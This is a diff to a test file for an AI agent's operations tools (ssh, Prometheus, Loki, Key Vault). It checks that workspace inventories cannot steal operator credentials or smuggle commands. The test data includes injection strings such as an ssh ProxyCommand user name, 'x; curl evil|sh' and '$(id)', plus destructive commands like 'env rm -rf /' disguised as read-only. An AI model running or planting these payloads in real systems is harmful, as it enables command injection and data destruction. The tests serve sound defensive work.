@@ -98,7 +98,7 @@ test('aiops inventory: a valid inventory, and every class of mistake named with 
     services: [{ name: 's', host: 'nope', health: 'not a url', env: 'qa', slos: [{ name: 'x', objective: 120 }] }],
     maintenance: [{ name: 'm', cron: '0 2 * *', duration: 'soon' }],
     alerts: [{ name: 'two', expr: 'up', probe: { type: 'http', url: 'http://x' } }, { name: 'p', expr: 'sum(rate(x[5m])' }, { name: 'l', logs: { service: 's', pattern: '(' } }],
-  });
+  }, { source: 'operator' });
   const all = bad.errors.join('\n');
   for (const re of [/monitoring.prometheus/, /credential "prod-root-password" is outside/, /host "a" appears twice/, /"local" is reserved/, /services.s: host "nope"/, /health "not a url"/, /env "qa"/, /objective must be/, /needs errors and total/, /cron .* five fields/, /duration "soon"/, /exactly one of expr/, /unclosed "\("/, /not a regular expression/]) assert.match(all, re);
   assert.equal(inventory.parseDuration('1h30m'), 5_400_000);
@@ -119,11 +119,201 @@ test('aiops inventory: with an operator file, the workspace cannot add hosts or 
   assert.deepEqual(inv.hosts.map((h: { name: string; address: string }) => `${h.name}@${h.address}`), ['db-1@10.0.0.5']);
   assert.ok(inv.services.some((s: { name: string }) => s.name === 'worker'), 'the workspace may add services');
   assert.match(inv.warnings.join('\n'), /host\(s\) are ignored/);
-  // Without an operator file, the workspace inventory is used whole.
+  // Without an operator file, the workspace inventory is used - without any credential it names.
   const alone = await inventory.loadInventory({ host, resolve, env: {} });
   assert.equal(alone.monitoring.prometheus, 'http://evil.example:9090');
   assert.equal(alone.hosts.length, 2);
   assert.equal(alone.hosts[0].source, 'workspace');
+  assert.ok(alone.hosts.every((h: { credential?: string }) => h.credential === undefined), 'a workspace host never carries a credential');
+  assert.match(alone.warnings.join('\n'), /credential "ops-db-1-key" is ignored: only the operator's inventory/);
+});
+
+// ---------------- security: what an inventory can make the tools do ----------------
+
+const PROXY = '-oProxyCommand=sh -c "echo pwned > /tmp/hw-pwned" #';
+
+test('aiops security: an inventory entry that is an ssh option or a shell command is dropped, and every command re-checks and quotes its names', async () => {
+  // The bad entries are reported and left out; nothing else is lost.
+  const r = inventory.validateInventory({
+    hosts: [{ name: 'evil', address: '10.0.0.9', user: PROXY, credential: 'ops-x' }, { name: 'dash', address: '-oProxyCommand=x', credential: 'ops-x' }, { name: 'ok', address: '10.0.0.5', user: 'ops', credential: 'ops-x' }],
+    services: [{ name: 'inj', host: 'ok', container: 'x; curl evil|sh' }, { name: 'unit', host: 'ok', unit: '-Hroot@evil' }, { name: 'file', host: 'ok', logs: { file: "/var/log/x'; id; '" } }, { name: 'good', host: 'ok', container: 'api' }],
+    alerts: [{ name: 'a', logs: { container: 'x;id', pattern: 'x' } }],
+  }, { source: 'operator' });
+  assert.deepEqual(r.inv.hosts.map((h: { name: string }) => h.name), ['ok']);
+  assert.deepEqual(r.inv.services.map((s: { name: string }) => s.name), ['good']);
+  assert.deepEqual(r.inv.alerts, []);
+  for (const re of [/hosts.evil: user .* is not a valid user name/, /hosts.dash: address/, /services.inj: container/, /services.unit: unit/, /services.file: logs.file/, /alerts.a: logs.container/, /hosts.evil: left out of the inventory until fixed/]) assert.match(r.errors.join('\n'), re);
+
+  // Through the tools: the operator's own file with such entries still never reaches ssh.
+  const opFile = path.join(await tempDir(), 'ops.json');
+  await fs.writeFile(opFile, JSON.stringify({ hosts: [{ name: 'evil', address: '127.0.0.1', port: 9, user: PROXY, credential: 'ops-x' }], services: [{ name: 'inj', host: 'local', container: 'x; curl evil|sh' }] }));
+  const ws = await workspace({ services: [{ name: 'svc', container: 'x$(id)' }] });
+  const reveals: string[] = [];
+  const vault = { list: async () => [], reveal: async (n: string) => { reveals.push(n); return 'pw'; }, envFor: async () => ({}) };
+  const { h, tool } = await harness();
+  process.env.HARNESS_OPS_INVENTORY = opFile;
+  try {
+    const ctx = ctxFor(ws, { vault });
+    assert.match((await tool('ssh_exec').run({ host: 'evil', command: 'uptime' }, ctx)).content, /No host "evil" in the inventory/);
+    assert.match((await tool('logs_search').run({ service: 'inj' }, ctx)).content, /No service "inj"/);
+    assert.match((await tool('service_control').run({ service: 'svc', action: 'restart' }, ctx)).content, /No service "svc"/);
+    assert.match((await tool('ops_inventory').run({ action: 'validate' }, ctx)).content, /hosts.evil: user .* is not a valid user name/);
+    assert.deepEqual(reveals, [], 'no credential was read for a dropped entry');
+  } finally { delete process.env.HARNESS_OPS_INVENTORY; await h.close(); }
+
+  // ssh's own arguments: the user as -l, "--" before the destination; a bad one is refused before anything runs.
+  assert.deepEqual(ssh.destination('ops', '10.0.0.5'), ['-l', 'ops', '--', '10.0.0.5']);
+  assert.throws(() => ssh.destination(PROXY, '10.0.0.5'), /not a valid user/);
+  assert.throws(() => ssh.destination('ops', '-oProxyCommand=x'), /not a valid address/);
+  await assert.rejects(ssh.sshRun({ address: '127.0.0.1', port: 9, user: PROXY, secret: 'pw', command: 'true', knownHosts: path.join(await tempDir(), 'kh') }), /not a valid user/);
+  // Remote commands: names checked again right before, and quoted.
+  const cmds = await import('../plugins/aiops/lib/commands.mjs' as string);
+  assert.equal(cmds.dockerLogsCmd('api', '15m', 100), "docker logs --timestamps --since '15m' --tail 100 -- 'api' 2>&1");
+  assert.equal(cmds.controlCmd('restart', { unit: 'nginx.service' }, 'ops'), "sudo -n systemctl restart -- 'nginx.service'");
+  assert.throws(() => cmds.dockerLogsCmd('x; curl evil|sh', '15m', 100), /not a valid container/);
+  assert.throws(() => cmds.containerStateCmd('x$(id)'), /not a valid container/);
+  assert.throws(() => cmds.unitStateCmd('-Hroot@evil'), /not a valid unit/);
+  assert.throws(() => cmds.tailFileCmd("/x'; id; '", 10), /not a valid file/);
+  assert.throws(() => cmds.controlCmd('kill; id', { container: 'api' }, 'root'), /not restart, start or stop/);
+});
+
+/** A Prometheus that records the Authorization header of every request. */
+async function recordingPrometheus() {
+  const auth: (string | undefined)[] = [];
+  const srv = http.createServer((req, res) => {
+    auth.push(req.headers.authorization);
+    res.writeHead(200, { 'content-type': 'application/json' });
+    res.end(JSON.stringify({ status: 'success', data: { resultType: 'vector', result: [] } }));
+  });
+  await new Promise<void>((r) => srv.listen(0, '127.0.0.1', () => r()));
+  return { url: `http://127.0.0.1:${(srv.address() as { port: number }).port}`, auth, close: () => new Promise<void>((r) => srv.close(() => r())) };
+}
+
+test('aiops security: a workspace inventory cannot send a vault credential anywhere, and gates never read the vault', async () => {
+  const evil = await recordingPrometheus();
+  const good = await recordingPrometheus();
+  const reveals: string[] = [];
+  const vault = { list: async () => [], reveal: async (n: string) => { reveals.push(n); return 'operator-prom-token-123'; }, envFor: async () => ({}) };
+  const { h, tool } = await harness();
+  try {
+    // The workspace names an endpoint and an operator credential for it, and a host with one.
+    const ws = await workspace({ monitoring: { prometheus: evil.url, prometheus_credential: 'ops-prom', loki: evil.url, loki_credential: 'ops-loki' }, hosts: [{ name: 'h1', address: '127.0.0.1', port: 9, user: 'ops', credential: 'ops-key' }], alerts: [{ name: 'A', expr: 'up == 0' }] });
+    const ctx = ctxFor(ws, { vault });
+    assert.deepEqual(tool('prometheus_query').vaultNames!({ query: 'up' }), [], 'nothing to decide: no operator credential applies');
+    const q = await tool('prometheus_query').run({ query: 'up' }, ctx);
+    assert.equal(q.is_error, undefined, q.content);
+    assert.deepEqual(evil.auth, [undefined], 'the workspace\'s endpoint got no credential');
+    await tool('logs_search').run({ query: '{job="x"}' }, ctx);
+    assert.ok(evil.auth.every((a) => a === undefined));
+    const s = await tool('ssh_exec').run({ host: 'h1', command: 'uptime' }, ctx);
+    assert.match(s.content, /comes from the workspace inventory, and only hosts in the operator's inventory .* get Key Vault credentials/);
+    // The gate makes no request to the workspace's endpoint at all.
+    const n = evil.auth.length;
+    const g = await runGates(h.registry, new LocalHost(ws), ['alerts-valid'], new AbortController().signal, { vault } as never);
+    assert.equal(g[0]!.pass, true, JSON.stringify(g));
+    assert.equal(evil.auth.length, n);
+    assert.deepEqual(reveals, [], 'the vault was never read');
+
+    // The operator's file attaches the credential to its endpoint; the workspace cannot move it.
+    const opFile = path.join(await tempDir(), 'ops.json');
+    await fs.writeFile(opFile, JSON.stringify({ monitoring: { prometheus: good.url, prometheus_credential: 'ops-prom' } }));
+    process.env.HARNESS_OPS_INVENTORY = opFile;
+    try {
+      assert.deepEqual(tool('prometheus_query').vaultNames!({ query: 'up' }), ['ops-prom'], 'the call declares the credential it will use');
+      const q2 = await tool('prometheus_query').run({ query: 'up' }, ctx);
+      assert.equal(q2.is_error, undefined, q2.content);
+      assert.equal(good.auth.at(-1), 'Bearer operator-prom-token-123');
+      assert.ok(evil.auth.every((a) => a === undefined), 'never the workspace\'s endpoint');
+      // A gate runs with no one to ask: it reads no vault entry (it says it skipped the check).
+      reveals.length = 0;
+      const g2 = await runGates(h.registry, new LocalHost(ws), ['alerts-valid', 'ops-healthy'], new AbortController().signal, { vault } as never);
+      assert.deepEqual(reveals, [], 'gates never read the vault');
+      assert.match(g2[0]!.summary, /parse check skipped: quality gates never use Key Vault credentials/);
+      assert.match(g2[1]!.details ?? g2[1]!.summary, /quality gates never use Key Vault credentials/);
+    } finally { delete process.env.HARNESS_OPS_INVENTORY; }
+  } finally { await h.close(); await evil.close(); await good.close(); }
+});
+
+test('aiops security: every credential a call uses is declared (vaultNames) and decided by the vault rules; a call cannot use one it did not declare; a companion gets none', async () => {
+  const opFile = path.join(await tempDir(), 'ops.json');
+  await fs.writeFile(opFile, JSON.stringify({
+    monitoring: { prometheus: 'http://127.0.0.1:9', prometheus_credential: 'ops-prom', loki: 'http://127.0.0.1:9', loki_credential: 'ops-loki' },
+    hosts: [{ name: 'db-1', address: '127.0.0.1', port: 9, user: 'ops', credential: 'ops-db-1-key' }, { name: 'web-1', address: '127.0.0.1', port: 9, user: 'ops', credential: 'ops-web-1-key' }],
+    services: [{ name: 'api', host: 'db-1', container: 'api' }, { name: 'logs-in-loki', host: 'web-1', logs: { loki: '{app="x"}' } }],
+  }));
+  const ws = await workspace({ services: [{ name: 'ws-svc', host: 'web-1', container: 'web', health: 'http://127.0.0.1:9/' }] });
+  const { h, tool } = await harness();
+  process.env.HARNESS_OPS_INVENTORY = opFile;
+  try {
+    const v = (n: string, i: Record<string, unknown>) => tool(n).vaultNames!(i);
+    assert.deepEqual(v('ssh_exec', { host: 'db-1', command: 'uptime' }), ['ops-db-1-key']);
+    assert.deepEqual(v('host_stats', { host: 'web-1' }), ['ops-web-1-key']);
+    assert.deepEqual(v('host_stats', { host: 'local' }), []);
+    assert.deepEqual(v('logs_search', { service: 'api' }), ['ops-db-1-key']);
+    assert.deepEqual(v('logs_search', { service: 'logs-in-loki' }), ['ops-loki']);
+    assert.deepEqual(v('logs_search', { query: '{a="b"}' }), ['ops-loki']);
+    assert.deepEqual(v('logs_search', { service: 'ws-svc' }), [], 'a workspace service declares nothing');
+    assert.deepEqual(v('service_control', { service: 'api', action: 'restart' }), ['ops-db-1-key']);
+    assert.deepEqual(v('slo_status', {}), ['ops-prom']);
+    assert.deepEqual(v('ops_check', {}).sort(), ['ops-db-1-key', 'ops-loki', 'ops-prom', 'ops-web-1-key']);
+    assert.equal(tool('probe').vaultNames, undefined);
+
+    // The vault rules decide them: a deny rule refuses, a sandbox still asks, an allow rule for the command alone is not enough.
+    const t = tool('ssh_exec') as Tool;
+    const call = { host: 'db-1', command: 'uptime' };
+    const rules = (r: Partial<Rules> = {}): Rules => ({ allow: [], deny: [], ask: [], ...r });
+    assert.equal(decide(t, call, { mode: 'bypass', rules: rules({ deny: ['vault(ops-db-*)'] }), sandboxed: true }).action, 'deny');
+    assert.equal(decide(tool('logs_search') as Tool, { service: 'api' }, { mode: 'acceptEdits', rules: rules(), sandboxed: true }).action, 'ask');
+    assert.equal(decide(t, call, { mode: 'default', rules: rules({ allow: ['ssh_exec(db-1 uptime)'], operatorAllow: ['ssh_exec(db-1 uptime)'] }), sandboxed: true }).action, 'ask');
+    assert.equal(decide(t, call, { mode: 'default', rules: rules({ allow: ['ssh_exec(db-1 uptime)', 'vault(ops-db-1-key)'], operatorAllow: ['ssh_exec(db-1 uptime)', 'vault(ops-db-1-key)'] }), sandboxed: true }).action, 'allow');
+    const tainted = decide(t, call, { mode: 'default', rules: rules({ allow: ['ssh_exec(db-1 uptime)', 'vault(ops-db-1-key)'] }), sandboxed: true, tainted: true });
+    assert.equal(tainted.action, 'ask');
+    assert.equal(tainted.guard, true, 'after untrusted content only the operator\'s rules hand out a credential');
+
+    // At run time a call can use only what it declared: a workspace service on an operator host does not get that host's key.
+    const reveals: string[] = [];
+    const vault = { list: async () => [], reveal: async (n: string) => { reveals.push(n); return 'k'; }, envFor: async () => ({}) };
+    const r = await tool('logs_search').run({ service: 'ws-svc' }, ctxFor(ws, { vault }));
+    assert.match(r.content, /credential "ops-web-1-key" is not one this call declared \(none\)/);
+    assert.deepEqual(reveals, []);
+    // A session on the user's computer (a companion) gets no credential at all.
+    const companion = { ...ctxFor(ws, { vault }), host: { kind: 'companion', root: '', displayRoot: 'C:/x', readFile: async () => null } } as unknown as ToolContext;
+    const c = await tool('prometheus_query').run({ query: 'up' }, companion);
+    assert.match(c.content, /not used in a session that works on your computer through the companion/);
+    assert.deepEqual(reveals, []);
+  } finally { delete process.env.HARNESS_OPS_INVENTORY; await h.close(); }
+});
+
+test('aiops security: the server\'s own Docker engine is off unless the operator allows containers, and never the harness\'s own', async () => {
+  const docker = await import('../plugins/aiops/lib/docker.mjs' as string);
+  const off = docker.localDockerPolicy({});
+  assert.equal(off.enabled, false);
+  assert.equal(off.allows({ name: 'shop-api', labels: {} }), false);
+  const p = docker.localDockerPolicy({ HARNESS_OPS_LOCAL_DOCKER: '1', HARNESS_OPS_LOCAL_DOCKER_ALLOW: 'shop-*, label:team=ops, harness-*' });
+  assert.equal(p.allows({ name: '/shop-api', labels: {} }), true);
+  assert.equal(p.allows({ name: 'billing', labels: { team: 'ops' } }), true);
+  assert.equal(p.allows({ name: 'billing', labels: { team: 'dev' } }), false);
+  assert.equal(p.allows({ name: 'harness-0123abcd', labels: {} }), false, 'a session sandbox, even when listed');
+  assert.equal(p.allows({ name: 'harness-egress-0123', labels: { 'harness-web': '1' } }), false, 'the egress proxy');
+  assert.equal(p.allows({ name: 'shop-x', labels: { 'harness-web': '1' } }), false, 'anything the harness labelled');
+  // The tools say so without touching the engine.
+  const ws = await workspace({ services: [{ name: 'local-svc', container: 'some-container' }] });
+  const { h, tool } = await harness();
+  const before = { on: process.env.HARNESS_OPS_LOCAL_DOCKER, docker: process.env.HARNESS_OPS_DOCKER };
+  delete process.env.HARNESS_OPS_LOCAL_DOCKER;
+  process.env.HARNESS_OPS_DOCKER = path.join(await tempDir(), 'no-such-docker');
+  try {
+    const ctx = ctxFor(ws);
+    for (const [n, i] of [['docker_status', {}], ['logs_search', { container: 'harness-0123abcd' }], ['service_control', { service: 'local-svc', action: 'stop' }], ['service_control', { service: 'local-svc', action: 'status' }]] as const) {
+      const r = await tool(n).run(i as Record<string, unknown>, ctx);
+      assert.equal(r.is_error, true, `${n}: ${r.content}`);
+      assert.match(r.content, /Docker engine is off for the ops tools/, n);
+    }
+  } finally {
+    if (before.on === undefined) delete process.env.HARNESS_OPS_LOCAL_DOCKER; else process.env.HARNESS_OPS_LOCAL_DOCKER = before.on;
+    if (before.docker === undefined) delete process.env.HARNESS_OPS_DOCKER; else process.env.HARNESS_OPS_DOCKER = before.docker;
+    await h.close();
+  }
 });
 
 // ---------------- the math ----------------
@@ -261,6 +451,10 @@ test('aiops ssh: read-only commands are told apart from changes (pipes, redirect
   const change = ['rm -rf /tmp/x', 'systemctl restart nginx', 'docker restart api', 'echo x > /etc/motd', 'find /data -name "*.tmp" -delete', 'sed -i s/a/b/ f', 'ls $(pwd)', 'ls `pwd`', 'cat f | tee g', 'apt-get upgrade -y', 'curl -X POST http://x', 'sh /data/app/bin/dbctl create-index x', 'kill 1', 'xargs rm < list'];
   for (const c of ro) assert.equal(ssh.isReadOnly(c), true, c);
   for (const c of change) assert.equal(ssh.isReadOnly(c), false, c);
+  // An allowlist of exact safe forms: what used to pass as read-only and does not.
+  const disguised = ['env rm -rf /', 'sudo dpkg --purge nginx', 'awk \'{print | "sh"}\' f', "awk 'BEGIN{system(\"id\")}'", 'awk -f x.awk f', "sed '1e id' f", "sed 's/a/b/e' f", "sed 's/a/b/w /tmp/x' f", 'sed {-i,} s/a/b/ f', 'git branch -D main', 'git branch newb', 'git log --output=/tmp/x', 'journalctl --vacuum-size=1M', 'hostname evil', 'sudo date -s 2020-01-01', 'LD_PRELOAD=/tmp/x.so ls', 'uniq a b', 'xxd -r a b', 'dmesg -C', 'rpm --eval "%(id)"', 'sort -o x y'];
+  for (const c of disguised) assert.equal(ssh.isReadOnly(c), false, c);
+  for (const c of ["sed -n '1,10p' /etc/hosts", "awk '{print $1}' /etc/passwd", 'git log --oneline -5', 'git branch -a', 'hostname', 'date +%s', 'dpkg -l nginx', 'rpm -qa', 'journalctl -u nginx -n 50']) assert.equal(ssh.isReadOnly(c), true, c);
   assert.equal(ssh.knownName('h', 22), 'h');
   assert.equal(ssh.knownName('h', 2222), '[h]:2222');
 });
@@ -432,6 +626,12 @@ test('aiops permissions: ssh_exec is asked unless an operator rule names that ho
     // "Always allow" suggests exactly this host and command, not the tool.
     const { suggestRule } = await import('../src/core/permissions.ts');
     assert.equal(suggestRule(t, call), 'ssh_exec(db-1 systemctl status nginx)');
+    // Re-pinning a host key is never covered by a rule for the command (exact or prefix): it is always asked.
+    const exact = rules([], ['ssh_exec(db-1 uptime)', 'ssh_exec(db-1:*)']);
+    assert.equal(decide(t, { host: 'db-1', command: 'uptime' }, { mode: 'default', rules: exact, sandboxed: true }).action, 'allow');
+    assert.equal(decide(t, { host: 'db-1', command: 'uptime', trust_host_key: 'SHA256:abc' }, { mode: 'default', rules: exact, sandboxed: true }).action, 'ask');
+    assert.equal(decide(t, { host: 'db-1', command: 'uptime', trust_host_key: 'SHA256:abc' }, { mode: 'dontAsk', rules: exact, sandboxed: true }).action, 'deny');
+    assert.match(t.summarize({ host: 'db-1', command: 'uptime', trust_host_key: 'SHA256:abc' }), /^RE-PIN the host key of db-1 to SHA256:abc/);
   } finally { await h.close(); }
 });
 
@@ -446,7 +646,7 @@ test('aiops tools against a fake Prometheus: inventory, queries, alert evaluatio
     }
     if (q.includes('sum(rate(e[')) return { status: 'success', data: { resultType: 'vector', result: [{ metric: {}, value: [0, q.includes('[5m]') || q.includes('[1h]') ? '0.02' : '0.0005'] }] } };
     if (q === 'sum(rate(t[1h]))' || q.startsWith('(sum(rate(e')) return { status: 'success', data: { resultType: 'vector', result: [{ metric: {}, value: [0, q.includes('[5m]') || q.includes('[1h]') ? '0.02' : '0.0005'] }] } };
-    if (q === 'bad(') return { status: 'error', errorType: 'bad_data', error: 'unexpected end of input' };
+    if (q.startsWith('bad(')) return { status: 'error', errorType: 'bad_data', error: 'unexpected end of input' };
     return { status: 'success', data: { resultType: 'vector', result: [{ metric: { __name__: 'up', job: 'api' }, value: [0, '1'] }] } };
   });
   const health = http.createServer((_q, r) => { r.writeHead(503); r.end('down'); });
@@ -458,14 +658,13 @@ test('aiops tools against a fake Prometheus: inventory, queries, alert evaluatio
   try {
     const ctx = ctxFor(ws);
     const list = await tool('ops_inventory').run({ action: 'list' }, ctx);
-    assert.match(list.content, /db-1: ops@10.0.0.5:22 env=prod tags=db credential=ops-db-1-key \[workspace\]/);
+    // A workspace inventory names hosts, never the credentials to send them.
+    assert.match(list.content, /db-1: ops@10.0.0.5:22 env=prod tags=db credential=\(none\) \[workspace\]/);
     assert.match(list.content, /api: host=db-1/);
     const val = await tool('ops_inventory').run({ action: 'validate' }, ctx);
     assert.equal(val.is_error, false, val.content);
     assert.match(val.content, /no Key Vault/);
-    // With a vault that lacks the credential, validation says so.
-    const withVault = await tool('ops_inventory').run({ action: 'validate' }, ctxFor(ws, { vault: { list: async () => [], reveal: async () => '' } }));
-    assert.match(withVault.content, /credential "ops-db-1-key" is not in the Key Vault/);
+    assert.match(val.content, /credential "ops-db-1-key" is ignored: only the operator's inventory/);
 
     const q = await tool('prometheus_query').run({ query: 'up' }, ctx);
     assert.match(q.content, /instant query .*1 series\nup\{job="api"\} = 1/);
@@ -494,14 +693,25 @@ test('aiops tools against a fake Prometheus: inventory, queries, alert evaluatio
     const fc = await tool('capacity_forecast').run({ query: 'disk_used', range: '1d', threshold: 100 }, ctx);
     assert.match(fc.content, /linear: 1440\/day, r² 1, .*reaches 100: 1\dm/);
 
-    // Gates: the inventory is valid; an alert Prometheus cannot parse fails alerts-valid.
+    // Gates: the inventory is valid. A gate sends nothing to a Prometheus the workspace named (no one is asked there).
+    const before = p.seen.length;
     const gates = await runGates(h.registry, new LocalHost(ws), ['inventory-valid', 'alerts-valid'], new AbortController().signal);
     assert.deepEqual(gates.map((g) => g.pass), [true, true], JSON.stringify(gates));
-    assert.match(gates[1]!.summary, /1 parsed by Prometheus/);
-    const ws2 = await workspace({ ...inv, alerts: [{ name: 'Broken', expr: 'bad(' }] });
-    const g2 = await runGates(h.registry, new LocalHost(ws2), ['alerts-valid'], new AbortController().signal);
-    assert.equal(g2[0]!.pass, false);
-    assert.match(g2[0]!.details!, /alerts.Broken/);
+    assert.match(gates[1]!.summary, /0 parsed by Prometheus \(the Prometheus parse check runs only against the operator's Prometheus/);
+    assert.equal(p.seen.length, before, 'the gate made no request to the workspace\'s Prometheus');
+    // The operator's Prometheus parses them; an alert it cannot parse fails alerts-valid.
+    const opFile = path.join(await tempDir(), 'ops.json');
+    await fs.writeFile(opFile, JSON.stringify({ monitoring: { prometheus: p.url } }));
+    process.env.HARNESS_OPS_INVENTORY = opFile;
+    try {
+      const og = await runGates(h.registry, new LocalHost(ws), ['alerts-valid'], new AbortController().signal);
+      assert.equal(og[0]!.pass, true, JSON.stringify(og));
+      assert.match(og[0]!.summary, /1 parsed by Prometheus/);
+      const ws2 = await workspace({ ...inv, alerts: [{ name: 'Broken', expr: 'bad()' }] });
+      const g2 = await runGates(h.registry, new LocalHost(ws2), ['alerts-valid'], new AbortController().signal);
+      assert.equal(g2[0]!.pass, false);
+      assert.match(g2[0]!.details!, /alerts.Broken: Prometheus does not parse it/);
+    } finally { delete process.env.HARNESS_OPS_INVENTORY; }
     // ops-healthy: the critical health probe fails it; it never runs unless named.
     const g3 = await runGates(h.registry, new LocalHost(ws), ['ops-healthy'], new AbortController().signal);
     assert.equal(g3[0]!.pass, false);
